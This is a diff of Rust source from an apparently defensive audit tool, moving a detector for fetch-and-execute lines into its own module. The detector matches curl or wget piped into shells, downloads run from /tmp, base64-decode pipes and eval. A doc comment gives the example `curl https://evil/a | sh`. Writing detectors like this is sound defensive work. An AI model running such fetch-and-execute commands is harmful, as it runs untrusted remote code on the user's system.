@@ -3,6 +3,9 @@
 
 use super::{AUTHORED, AuditRule, Finding, Line, Outcome, Prepared, Severity, at, scan_docs};
 
+mod fetch;
+use fetch::fetch_and_run;
+
 pub(super) fn rules() -> Vec<Box<dyn AuditRule>> {
     vec![
         Box::new(PromptInjection),
@@ -92,146 +95,6 @@ impl AuditRule for Rce {
     fn id(&self) -> &'static str {
         "rce"
     }
-}
-
-/// What this line does, and what it does it to — so two lines that reach
-/// for two different things are two questions. A finding's identity is its
-/// rule and its sentence, and a sentence that says only "this line" is the
-/// same sentence wherever it fires: the person is shown one and settles
-/// both.
-///
-/// Named from the line, never from the file it sits in: a file is something
-/// kendex's own rendering moves between (an over-cap body is split into
-/// `references/`), and an identity that moved with it would stop being the
-/// finding a decision was made about.
-struct Reach {
-    what: &'static str,
-    /// How the operand attaches to `what` — "from", "with", "out of",
-    /// "built from".
-    preposition: &'static str,
-    operand: String,
-}
-
-impl Reach {
-    fn said(&self) -> String {
-        if self.operand.is_empty() {
-            return self.what.to_owned();
-        }
-        const CAP: usize = 60;
-        let shown = crate::quality::redact(&self.operand);
-        // An `eval` argument is a whole program on one line, and a message
-        // is a sentence. What is cut is named by a digest of the whole, so
-        // two long operands sharing a prefix stay two questions.
-        let shown = match shown.char_indices().nth(CAP) {
-            None => shown,
-            Some((at, _)) => format!("{}… {}", &shown[..at], crate::quality::digest(&shown)),
-        };
-        format!("{} {} `{shown}`", self.what, self.preposition)
-    }
-}
-
-/// A plain description of what this line fetches and runs, if it does.
-fn fetch_and_run(line: &Line) -> Option<Reach> {
-    const SHELLS: &[&str] = &["| sh", "|sh", "| bash", "|bash", "| zsh", "| python"];
-    let fetch = ["curl", "wget"]
-        .iter()
-        .find_map(|verb| line.find(verb).map(|at| at + verb.len()));
-    if let Some(after) = fetch {
-        let downloaded = if SHELLS.iter().any(|shell| line.has(shell)) {
-            Some("pipes a download straight into a shell")
-        } else if line.has("/tmp/")
-            && ["&& sh", "&& bash", "chmod +x"]
-                .iter()
-                .any(|run| line.has(run))
-        {
-            Some("downloads a file and then executes it")
-        } else {
-            None
-        };
-        if let Some(what) = downloaded {
-            let (preposition, operand) = fetched(line, after);
-            return Some(Reach {
-                what,
-                preposition,
-                operand,
-            });
-        }
-    }
-    if line.has("base64") && line.has("|") && (line.has("-d") || line.has("--decode")) {
-        return Some(Reach {
-            what: "decodes hidden text and pipes it onward",
-            preposition: "out of",
-            // Where an encoded payload is written, whether it is piped in
-            // or passed on the decoding command itself.
-            operand: line
-                .text
-                .split('|')
-                .next()
-                .unwrap_or(&line.text)
-                .trim()
-                .to_owned(),
-        });
-    }
-    line.find("eval(").map(|at| Reach {
-        what: "hands a built-up string to an interpreter",
-        preposition: "built from",
-        operand: line.text[at + "eval(".len()..]
-            .split(')')
-            .next()
-            .unwrap_or_default()
-            .trim()
-            .to_owned(),
-    })
-}
-
-/// What a fetch verb is pointed at, and how to say it: the address it
-/// names, or — where the address is not written out — its whole argument
-/// list.
-///
-/// Both are read from this command's own arguments and never from the rest
-/// of the line. `echo https://docs; curl https://evil/a | sh` downloads the
-/// second address, and naming the first would give two lines running two
-/// different payloads one sentence, and therefore one decision.
-///
-/// The whole argument list, because which token is the operand depends on
-/// the arity of every option before it — `curl -o /tmp/payload "$URL"`
-/// hands `-o` a value, and picking the first non-switch token calls the
-/// output path the download. Keeping the list is what makes two fetches
-/// that differ anywhere in it two questions.
-///
-/// The address is located in the flattened line and cut from the original,
-/// so `CURL HTTPS://…` is the match the detector already made — which reads
-/// the flattened text — and still prints the way it was written.
-fn fetched(line: &Line, after: usize) -> (&'static str, String) {
-    const BOUNDARY: &[char] = &['"', '\'', '`', ' ', '\t', ')', '(', '<', '>', ';', ','];
-    let args = arguments(line, after);
-    for scheme in ["https://", "http://"] {
-        let Some(at) = line.lower[args.clone()].find(scheme) else {
-            continue;
-        };
-        let rest = &line.text[args.start + at..args.end];
-        let url = rest.split(BOUNDARY).next().unwrap_or(rest);
-        if url.len() > scheme.len() {
-            return ("from", url.to_owned());
-        }
-    }
-    let spelled = line.text[args]
-        .split_whitespace()
-        .collect::<Vec<&str>>()
-        .join(" ");
-    ("with", spelled)
-}
-
-/// Where this fetch command's own arguments end: at the pipe or the `&&`
-/// that begins the next command, or at the end of the line.
-fn arguments(line: &Line, after: usize) -> std::ops::Range<usize> {
-    let rest = &line.lower[after..];
-    let end = ["|", "&&"]
-        .iter()
-        .filter_map(|separator| rest.find(separator))
-        .min()
-        .unwrap_or(rest.len());
-    after..after + end
 }
 
 /// Files that hold credentials, and the verbs that would send them
